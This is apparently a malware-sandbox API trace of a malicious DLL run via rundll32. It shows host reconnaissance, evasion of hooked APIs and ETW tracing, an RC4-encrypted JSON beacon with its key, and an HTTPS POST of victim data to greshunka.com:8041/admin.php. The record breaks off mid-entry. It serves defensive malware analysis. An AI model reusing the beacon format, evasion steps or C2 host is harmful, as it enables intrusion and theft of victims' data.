+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <GetUserNameW> in [ADVAPI32.dll] 
+[PAR] LPWSTR  lpBuffer  : 0x000000E041D0E4C0
+[PAR] LPDWORD pcbBuffer : 0x000000E041D0E354
+[RET] [0xe041c74d98]
+
+[CNT] [285]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <GetComputerNameExW> in [KERNEL32.DLL] 
+[PAR] COMPUTER_NAME_FORMAT NameType : 0x3 (ComputerNameDnsFullyQualified)
+[PAR] LPWSTR               lpBuffer : 0x0
+[PAR] LPDWORD              nSize    : 0x0
+[RET] [0xe041c74dad]
+
+[CNT] [286]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <GetComputerNameExW> in [KERNEL32.DLL] 
+[PAR] COMPUTER_NAME_FORMAT NameType : 0x3 (ComputerNameDnsFullyQualified)
+[PAR] LPWSTR               lpBuffer : 0x000000E03FD5C840
+[PAR] LPDWORD              nSize    : 0x000000E03FD5C840
+[RET] [0xe041c74ddc]
+
+[CNT] [287]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtOpenProcessToken> in [ntdll.dll] 
+[PAR] HANDLE      ProcessHandle : 0xFFFFFFFFFFFFFFFF
+[PAR] ACCESS_MASK DesiredAccess : 0x8 (TOKEN_QUERY)
+[PAR] PHANDLE     TokenHandle   : 0x000000E041D0E368
+[RET] [0xe041c84b2f]
+
+[CNT] [288]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <GetTokenInformation> in [ADVAPI32.dll] 
+[PAR] HANDLE                  TokenHandle            : 0x15c
+[PAR] TOKEN_INFORMATION_CLASS TokenInformationClass  : 0x14(TokenElevation)
+[PAR] LPVOID                  TokenInformation       : 0x000000E041D0E34C
+[PAR] DWORD                   TokenInformationLength : 0x4
+[PAR] PDWORD                  ReturnLength           : 0x000000E041D0E358
+[RET] [0xe041c74e18]
+
+[CNT] [289]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtClose> in [ntdll.dll] 
+[PAR] HANDLE    Handle  : 0x15c
+[RET] [0xe041c74e58]
+
+[CNT] [290]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <GetCurrentProcessId> in [KERNEL32.DLL] 
+[RET] [0xe041c74e5e]
+
+[CNT] [291]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <GetModuleFileNameW> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : NULL. (Try to get current .exe's path)
+[PAR] LPSTR   lpFilename : 0x000000E041D0E6C8
+[PAR] DWORD   nSize      : 0x104
+[RET] [0xe041c74e7a]
+
+[CNT] [292]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <CryptBinaryToStringW> in [crypt32.dll] 
+[PAR] BYTE*  pbBinary   : 0x000000E041D0E6C8
+[PAR] DWORD  cbBinary   : 0x40
+[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
+[PAR] LPWSTR pszString  : 0x0
+[PAR] DWORD* pcchString : 0x000000E041D0E2DC
+[RET] [0xe041c6dff1]
+
+[CNT] [293]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <CryptBinaryToStringW> in [crypt32.dll] 
+[PAR] BYTE*  pbBinary   : 0x000000E041D0E6C8
+[PAR] DWORD  cbBinary   : 0x40
+[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
+[PAR] LPWSTR pszString  : 0x000000E03FD57570
+[PAR] DWORD* pcchString : 0x000000E041D0E2DC
+[RET] [0xe041c6e028]
+
+[CNT] [294]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <GetNativeSystemInfo> in [KERNEL32.DLL] 
+[PAR] LPSYSTEM_INFO lpSystemInfo : 0x000000E041D0E378
+[RET] [0xe041c74eca]
+
+[CNT] [295]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <RtlGetVersion> in [ntdll.dll] 
+[RET] [0xe041c74f40]
+
+[CNT] [296]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnwprintf> in [ntdll.dll] 
+[PAR] wchar_t  *buffer : 0x0
+[PAR] size_t   size    : 0x0
+[PAR] wchar_t  *format : 0x000000E041C8847A
+[PAR] va_list  argptr  : 0x000000E041D0E320
+[RET] [0xe041c83d18]
+
+[CNT] [297]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnwprintf> in [ntdll.dll] 
+[PAR] wchar_t  *buffer : 0x000000E03FD5C090
+[PAR] size_t   size    : 0x1
+[PAR] wchar_t  *format : 0x000000E041C8847A
+[PAR] va_list  argptr  : 0x000000E041D0E320
+[RET] [0xe041c83d41]
+
+[ * ] [pid 0xa6c][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <_vsnwprintf>
+[PAR] wchar_t  *buffer : 0x000000E03FD5C090
+[STR]          -> "6"
+[RES] int 1
+
+[CNT] [298]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnwprintf> in [ntdll.dll] 
+[PAR] wchar_t  *buffer : 0x0
+[PAR] size_t   size    : 0x0
+[PAR] wchar_t  *format : 0x000000E041C8847A
+[PAR] va_list  argptr  : 0x000000E041D0E320
+[RET] [0xe041c83d18]
+
+[CNT] [299]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnwprintf> in [ntdll.dll] 
+[PAR] wchar_t  *buffer : 0x000000E03FD5C080
+[PAR] size_t   size    : 0x1
+[PAR] wchar_t  *format : 0x000000E041C8847A
+[PAR] va_list  argptr  : 0x000000E041D0E320
+[RET] [0xe041c83d41]
+
+[ * ] [pid 0xa6c][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <_vsnwprintf>
+[PAR] wchar_t  *buffer : 0x000000E03FD5C080
+[STR]          -> "3"
+[RES] int 1
+
+[CNT] [300]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnwprintf> in [ntdll.dll] 
+[PAR] wchar_t  *buffer : 0x0
+[PAR] size_t   size    : 0x0
+[PAR] wchar_t  *format : 0x000000E041C8847A
+[PAR] va_list  argptr  : 0x000000E041D0E320
+[RET] [0xe041c83d18]
+
+[CNT] [301]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnwprintf> in [ntdll.dll] 
+[PAR] wchar_t  *buffer : 0x000000E03FD5C140
+[PAR] size_t   size    : 0x4
+[PAR] wchar_t  *format : 0x000000E041C8847A
+[PAR] va_list  argptr  : 0x000000E041D0E320
+[RET] [0xe041c83d41]
+
+[ * ] [pid 0xa6c][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <_vsnwprintf>
+[PAR] wchar_t  *buffer : 0x000000E03FD5C140
+[STR]          -> "9600"
+[RES] int 4
+
+[CNT] [302]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <GetAdaptersInfo> in [iphlpapi.dll] 
+[PAR] PIP_ADAPTER_INFO AdapterInfo : 0x0
+[PAR] PULONG           SizePointer : 0x000000E041D0E35C
+[RET] [0xe041c74fb6]
+
+[CNT] [303]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <GetAdaptersInfo> in [iphlpapi.dll] 
+[PAR] PIP_ADAPTER_INFO AdapterInfo : 0x000000E03FD5F7A0
+[PAR] PULONG           SizePointer : 0x000000E041D0E35C
+[RET] [0xe041c74ffb]
+
+[CNT] [304]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnwprintf> in [ntdll.dll] 
+[PAR] wchar_t  *buffer : 0x0
+[PAR] size_t   size    : 0x0
+[PAR] wchar_t  *format : 0x000000E041C88444
+[PAR] va_list  argptr  : 0x000000E041D0E320
+[RET] [0xe041c83d18]
+
+[CNT] [305]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnwprintf> in [ntdll.dll] 
+[PAR] wchar_t  *buffer : 0x000000E03FD5D960
+[PAR] size_t   size    : 0xe
+[PAR] wchar_t  *format : 0x000000E041C88444
+[PAR] va_list  argptr  : 0x000000E041D0E320
+[RET] [0xe041c83d41]
+
+[ * ] [pid 0xa6c][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <_vsnwprintf>
+[PAR] wchar_t  *buffer : 0x000000E03FD5D960
+[STR]          -> "169.254.143.85"
+[RES] int 14
+
+[CNT] [306]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtSetEvent> in [ntdll.dll] 
+[PAR] HANDLE EventHandle   : 0x114
+[PAR] PLONG  PreviousState : 0x0
+[RET] [0xe041c57daf]
+
+[CNT] [307]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <WSAStartup> in [ws2_32.dll] 
+[PAR] WORD wVersionRequested : 0x202
+[RET] [0xe041c57dcb]
+
+[CNT] [308]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtClose> in [ntdll.dll] 
+[PAR] HANDLE    Handle  : 0x118
+[RET] [0xe041c57350]
+
+[CNT] [309]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtClose> in [ntdll.dll] 
+[PAR] HANDLE    Handle  : 0x114
+[RET] [0xe041c57359]
+
+[CNT] [310]
+[PTP] [0xa6c] [0xad0] [c:\windows\system32\rundll32.exe]
+[API] <RtlExitUserThread> in [ntdll.dll] 
+[PAR] NTSTATUS ExitStatus : 0x0
+[RET] [0xe0400ec1bc]
+
+[CNT] [311]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtQueryVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE                   ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID                    BaseAddress            : 0x000000E0400ED035
+[PAR] MEMORY_INFORMATION_CLASS MemoryInformationClass : 0x0 (MemoryBasicInformation)
+[PAR] PVOID                    Buffer                 : 0x000000E041D0E9F0
+[RET] [0xe041c84fbb]
+
+[CNT] [312]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtFreeVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE    ProcessHandle  : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID     *BaseAddress   : 0x000000E041D0E9F8 (0x000000E0400B0000)
+[PAR] PSIZE_T   RegionSize     : 0x000000E041D0E9E8
+[PAR] ULONG     FreeType       : 0x8000 (MEM_RELEASE)
+[RET] [0xe041c847ad]
+
+[CNT] [313]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <RtlAddVectoredExceptionHandler> in [ntdll.dll] 
+[PAR] ULONG                       First   : 0x1
+[PAR] PVECTORED_EXCEPTION_HANDLER Handler : 0x000000E041C5BFA0
+[RET] [0xe041c6781f]
+
+[CNT] [314]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtGetContextThread> in [ntdll.dll] 
+[PAR] HANDLE   ThreadHandle  : 0xFFFFFFFFFFFFFFFE
+[PAR] PCONTEXT ThreadContext : 0x000000E041D0E230
+[RET] [0xe041c680fd]
+
+[CNT] [315]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtSetContextThread> in [ntdll.dll] 
+[PAR] HANDLE   ThreadHandle : 0xfffffffe
+[PAR] PCONTEXT Context      : 0x000000E041D0E230
+[FLD]          -> ContextFlags = 0x100010 (CONTEXT_DEBUG_REGISTERS)
+[FLD]          -> Dr0          = 0x00007FFA03692630 (ntdll.dll!NtTraceControl)
+[FLD]          -> Dr7          = 0x1
+[RET] [0xe041c6816e]
+
+[CNT] [316]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <TpAllocWork> in [ntdll.dll] 
+[PAR] PTP_WORK             *WorkReturn     : 0x000000E041D0E750
+[PAR] PTP_WORK_CALLBACK    Callback        : 0x000000E041C53250
+[PAR] PVOID                Context         : 0x000000E041D0E758
+[PAR] PTP_CALLBACK_ENVIRON CallbackEnviron : 0x0
+[RET] [0xe041c678a7]
+
+[CNT] [317]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <TpPostWork> in [ntdll.dll] 
+[PAR] PTP_WORK    Work : 0x000000E03FD5E160
+[RET] [0xe041c678b2]
+
+[CNT] [318]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <TpReleaseWork> in [ntdll.dll] 
+[PAR] PTP_WORK    Work : 0x000000E03FD5E160
+[RET] [0xe041c678bd]
+
+[CNT] [319]
+[PTP] [0xa6c] [0xac4] [c:\windows\system32\rundll32.exe]
+[INF] [ Thread is from a Worker Pool ]
+[API] <LoadLibraryExA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR lpFileName : 0x000000E041D0E7D4 ("wininet.dll")
+[PAR] DWORD   dwFlags    : 0x0 (Same behavior as LoadLibrary)
+[RET] 0x7ffa026353c7
+
+[CNT] [320]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <RtlRemoveVectoredExceptionHandler> in [ntdll.dll] 
+[PAR] PVOID Handle : 0x000000E03FD5D7B0
+[RET] [0xe041c678fa]
+
+[CNT] [321]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtGetContextThread> in [ntdll.dll] 
+[PAR] HANDLE   ThreadHandle  : 0xFFFFFFFFFFFFFFFE
+[PAR] PCONTEXT ThreadContext : 0x000000E041D0E230
+[RET] [0xe041c67a88]
+
+[CNT] [322]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtSetContextThread> in [ntdll.dll] 
+[PAR] HANDLE   ThreadHandle : 0xfffffffe
+[PAR] PCONTEXT Context      : 0x000000E041D0E230
+[FLD]          -> ContextFlags = 0x100010 (CONTEXT_DEBUG_REGISTERS)
+[FLD]          -> Dr7          = 0x400
+[RET] [0xe041c67afe]
+
+[CNT] [323]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <ReleaseMutex> in [KERNEL32.DLL] 
+[PAR] HANDLE hMutex : 0x130
+[RET] [0xe041c6345e]
+
+[CNT] [324]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnwprintf> in [ntdll.dll] 
+[PAR] wchar_t  *buffer : 0x0
+[PAR] size_t   size    : 0x0
+[PAR] wchar_t  *format : 0x000000E041C8844A
+[PAR] va_list  argptr  : 0x000000E041D0E810
+[RET] [0xe041c83d18]
+
+[CNT] [325]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnwprintf> in [ntdll.dll] 
+[PAR] wchar_t  *buffer : 0x000000E03FD5C780
+[PAR] size_t   size    : 0x4
+[PAR] wchar_t  *format : 0x000000E041C8844A
+[PAR] va_list  argptr  : 0x000000E041D0E810
+[RET] [0xe041c83d41]
+
+[ * ] [pid 0xa6c][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <_vsnwprintf>
+[PAR] wchar_t  *buffer : 0x000000E03FD5C780
+[STR]          -> "2668"
+[RES] int 4
+
+[CNT] [326]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnwprintf> in [ntdll.dll] 
+[PAR] wchar_t  *buffer : 0x0
+[PAR] size_t   size    : 0x0
+[PAR] wchar_t  *format : 0x000000E041C8844A
+[PAR] va_list  argptr  : 0x000000E041D0E810
+[RET] [0xe041c83d18]
+
+[CNT] [327]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnwprintf> in [ntdll.dll] 
+[PAR] wchar_t  *buffer : 0x000000E03FD5C300
+[PAR] size_t   size    : 0x4
+[PAR] wchar_t  *format : 0x000000E041C8844A
+[PAR] va_list  argptr  : 0x000000E041D0E810
+[RET] [0xe041c83d41]
+
+[ * ] [pid 0xa6c][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <_vsnwprintf>
+[PAR] wchar_t  *buffer : 0x000000E03FD5C300
+[STR]          -> "2748"
+[RES] int 4
+
+[CNT] [328]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnprintf> in [ntdll.dll] 
+[PAR] char     *buffer : 0x0
+[PAR] size_t   size    : 0x0
+[PAR] char_t   *format : 0x000000E041C884D4
+[PAR] va_list  argptr  : 0x000000E041D0E810
+[RET] [0xe041c59448]
+
+[CNT] [329]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnprintf> in [ntdll.dll] 
+[PAR] char     *buffer : 0x000000E03FD58240
+[PAR] size_t   size    : 0x10a
+[PAR] char_t   *format : 0x000000E041C884D4
+[PAR] va_list  argptr  : 0x000000E041D0E810
+[RET] [0xe041c5946e]
+
+[ * ] [pid 0xa6c][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <_vsnprintf>
+[PAR] char_t   *buffer : 0x000000E03FD58240
+[STR]          -> "{"cds":{"auth":"OV1T557KBIUECUM5"},"mtdt":{"h_name":"home","wver":"x64/6.3","ip":"169.254.143.85","arch":"x64","bld":"96"
+[STR]             "00","p_name":"QwA6AFwAVwBpAG4AZABvAHcAcwBcAHMAeQBzAHQAZQBtADMAMgBcAHIAdQBuAGQAbABsADMAMgAuAGUAeABlAA==","uid":"user","pi"
+[STR]             "d":"2668","tid":"2748"}}"
+[RES] int 266
+
+[CNT] [330]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <SystemFunction032> in [CRYPTSP.DLL] 
+[INF] [ Undocumented RC4 implementation ]
+[PAR] PBINARY_STRING buffer : 0x000000E041D0E780
+[FLD]                -> Length    = 0x10a
+[FLD]                -> MaxLength = 0x10a
+[FLD]                -> Buffer    = 0x000000E03FD58900 
+[PAR] PBINARY_STRING key    : 0x000000E041D0E770
+[FLD]                -> Length    = 0x10
+[FLD]                -> MaxLength = 0x10
+[FLD]                -> Buffer    = 0x000000E03FD5CEE0 ("S47EFEUO3D2O6641")
+[RET] [0xe041c54c35]
+
+[CNT] [331]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <rand> in [msvcrt.dll] 
+[RET] [0xe041c68079]
+
+[CNT] [332]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <rand> in [msvcrt.dll] 
+[RET] [0xe041c68079]
+
+[CNT] [333]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <rand> in [msvcrt.dll] 
+[RET] [0xe041c68079]
+
+[CNT] [334]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <rand> in [msvcrt.dll] 
+[RET] [0xe041c68079]
+
+[CNT] [335]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <rand> in [msvcrt.dll] 
+[RET] [0xe041c68079]
+
+[CNT] [336]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <InternetOpenW> in [wininet.dll] 
+[PAR] LPCWSTR lpszAgent       : 0x000000E03FD5CDF0
+[STR]         -> "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"
+[PAR] DWORD   dwAccessType    : 0x0 (INTERNET_OPEN_TYPE_PRECONFIG)
+[PAR] LPCWSTR lpszProxyName   : 0x0 (null)
+[PAR] LPCWSTR lpszProxyBypass : 0x0 (null)
+[PAR] DWORD   dwFlags         : 0x0 
+[RET] [0xe041c5788c]
+
+Thread created by monitored process : Now monitoring [pid 0xa6c][tid 0xac0]
+
+Thread created by monitored process : Now monitoring [pid 0xa6c][tid 0xab0]
+
+[CNT] [337]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <InternetConnectW> in [wininet.dll] 
+[PAR] HINTERNET     hInternet      : 0xcc0004
+[PAR] LPCWSTR       lpszServerName : 0x000000E03FD51850 ("greshunka.com")
+[PAR] INTERNET_PORT nServerPort    : 8041
+[PAR] LPCWSTR       lpszUsername   : 0x0 (null)
+[PAR] LPCWSTR       lpszPassword   : 0x0 (null)
+[PAR] DWORD         dwService      : 0x3 (INTERNET_SERVICE_HTTP)
+[PAR] DWORD         dwFlags        : 0x0 
+[RET] [0xe041c578d1]
+
+[CNT] [338]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <HttpOpenRequestW> in [wininet.dll] 
+[PAR] HINTERNET hConnect           : 0xcc0008
+[PAR] LPCWSTR   lpszVerb           : 0x000000E041C88F50 ("POST")
+[PAR] LPCWSTR   lpszObjectName     : 0x000000E03FD5C2A0
+[STR]           -> "/admin.php"
+[PAR] LPCWSTR   lpszVersion        : 0x0 (null)
+[PAR] LPCWSTR   lpszReferer        : 0x0 (null)
+[PAR] LPCWSTR   *lplpszAcceptTypes : 0x0
+[PAR] DWORD     dwFlags            : 0x84c80300 (INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_COOKIES | INTERNET_FLAG_NO_UI | INTERNET_FLAG_PRAGMA_NOCACHE)
+[RET] [0xe041c57925]
+
+[CNT] [339]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <InternetSetOptionW> in [wininet.dll] 
+[PAR] HINTERNET hInternet      : 0xcc000c
+[PAR] DWORD     dwOption       : 0x1f (INTERNET_OPTION_SECURITY_FLAGS)
+[PAR] LPVOID    lpBuffer       : 0x000000E041D0E7A4
+[PAR] DWORD     dwBufferLength : 0x4
+[RET] [0xe041c579a9]
+
+[CNT] [340]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <HttpSendRequestA> in [wininet.dll] 
+[PAR] HINTERNET hRequest         : 0xcc000c
+[PAR] LPCTSTR   lpszHeaders      : 0x0 (null)
+[PAR] DWORD     dwHeadersLength  : 0x0
+[PAR] LPVOID    lpOptional       : 0x000000E03FD561C0
+[STR]           -> "88ea80d0a8145617084c1971a2e5f10dafc825dfa01aa9131c31eed2159e33380dff1f6c5b2b0f95bf9e3eccd60c1d280c96fa1f4acd82ac6739fad4"
+[STR]              "6dc3ae39d58a579d7cbdc8dd1c967704a3b004fc992ed35b62fc6c335fdabf3d06f73d1be31cfa6e400611012495666f57da92a1ce53a79a2a8a3bd1"
+[STR]              "a17fa2ed8fb54d132d80e926f544078052cf155d1dfb93137bf25aff3337a6e363e7a802c276d9ed4b0d03bdb4b22fc8ce5ecaa162f5cdca8f199770"
+[STR]              "4a349921f9a0b1d11f2dd44af30628be98cea3f63a006f832b5468f7afaeb783ac1299062871d81cb499b6d15a4dbcc66ff0959fdaf1cd309dc790e0"
+[STR]              "25725ea1c95ef9ef0283f09beef05c8dc375080d6f0c71cdb1da"
+[PAR] DWORD     dwOptionalLength : 0x214
+[RET] [0xe041c579dc]
+
+[ * ] [pid 0xa6c][tid 0xabc] c:\windows\system32\rundll32.exe
+[EVT] [Kernel Monitoring]
+[MSG] [FILE_CREATED] [C:\Users\user\AppData\Local]
+
+[CNT] [341]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <InternetQueryDataAvailable> in [wininet.dll] 
+[PAR] HINTERNET hFile                    : 0xcc000c
+[PAR] LPCVOID   lpBuffer                 : 0x000000E041D0E7A8
+[PAR] DWORD     dwNumberOfBytesToWrite   : 0x0
+[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x0
+[RET] [0xe041c57a59]
+
+[CNT] [342]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <InternetReadFile> in [wininet.dll] 
+[PAR] HINTERNET hFile                 : 0xcc000c
+[PAR] LPVOID    lpBuffer              : 0x000000E03FD94E90
+[PAR] DWORD     dwNumberOfBytesToRead : 0x1d
+[PAR] LPDWORD   lpdwNumberOfBytesRead : 0x000000E041D0E7AC
+[RET] [0xe041c57a7c]
+
+[CNT] [343]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <InternetQueryDataAvailable> in [wininet.dll] 
+[PAR] HINTERNET hFile                    : 0xcc000c
+[PAR] LPCVOID   lpBuffer                 : 0x000000E041D0E7A8
+[PAR] DWORD     dwNumberOfBytesToWrite   : 0x0
+[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x0
+[RET] [0xe041c57a59]
+
+[CNT] [344]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <InternetCloseHandle> in [wininet.dll] 
+[PAR] HINTERNET  hInternet : 0xcc000c
+[RET] [0xe041c57b17]
+
+[CNT] [345]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <InternetCloseHandle> in [wininet.dll] 
+[PAR] HINTERNET  hInternet : 0xcc0008
+[RET] [0xe041c57b25]
+
+[CNT] [346]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <InternetCloseHandle> in [wininet.dll] 
+[PAR] HINTERNET  hInternet : 0xcc0004
+[RET] [0xe041c57b33]
+
+[CNT] [347]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <CryptStringToBinaryA> in [crypt32.dll] 
+[PAR] LPCTSTR pszString  : 0x000000E03FD84FF0
+[STR]         -> "<?php"
+[STR]            "echo 'Hello Bazaar\n';"
+[PAR] DWORD   cchString  : 0x0
+[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
+[PAR] BYTE    *pbBinary  : 0x0
+[PAR] DWORD   *pcbBinary : 0x000000E041D0E7DC
+[PAR] DWORD   *pdwSkip   : 0x0
+[PAR] DWORD   *pdwFlags  : 0x0
+[RET] [0xe041c6be5c]
+
+[CNT] [348]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <CryptStringToBinaryA> in [crypt32.dll] 
+[PAR] LPCTSTR pszString  : 0x000000E03FD84FF0
+[STR]         -> "<?php"
+[STR]            "echo 'Hello Bazaar\n';"
+[PAR] DWORD   cchString  : 0x0
+[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
+[PAR] BYTE    *pbBinary  : 0x000000E03FD5C000
+[PAR] DWORD   *pcbBinary : 0x000000E041D0E7DC
+[PAR] DWORD   *pdwSkip   : 0x0
+[PAR] DWORD   *pdwFlags  : 0x0
+[RET] [0xe041c6bea1]
+
+[CNT] [349]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <rand> in [msvcrt.dll] 
+[RET] [0xe041c68cc0]
+
+[CNT] [350]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <SystemFunction036> in [CRYPTBASE.DLL] 
+[INF] [ RtlGenRandom ]
+[PAR] PVOID RandomBuffer       : 0x000000E041D0E8C0
+[PAR] ULONG RandomBufferLength : 0x10
+[RET] [0xe041c68db2]
+
+[CNT] [351]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <ConvertThreadToFiber> in [KERNEL32.DLL] 
+[PAR] LPVOID lp[PAR] 0x0
+[RET] [0xe041c68dc5]
+
+[CNT] [352]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <CreateFiber> in [KERNEL32.DLL] 
+[PAR] SIZE_T                dwStackSize    : 0x100000
+[PAR] LPFIBER_START_ROUTINE lpStartAddress : 0x000000E041C655C0
+[PAR] LPVOID                lpParameter    : 0x000000E041D0E940
+[RET] [0xe041c68e07]
+
+[CNT] [353]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <SwitchToFiber> in [KERNEL32.DLL] 
+[PAR] LPVOID lpFiber : 0x000000E03FD8D520
+[RET] [0xe041c68e13]
+
+[CNT] [354]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <SystemFunction036> in [CRYPTBASE.DLL] 
+[INF] [ RtlGenRandom ]
+[PAR] PVOID RandomBuffer       : 0x000000E04227F684
+[PAR] ULONG RandomBufferLength : 0x10
+[RET] [0xe041c685a6]
+
+[CNT] [355]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
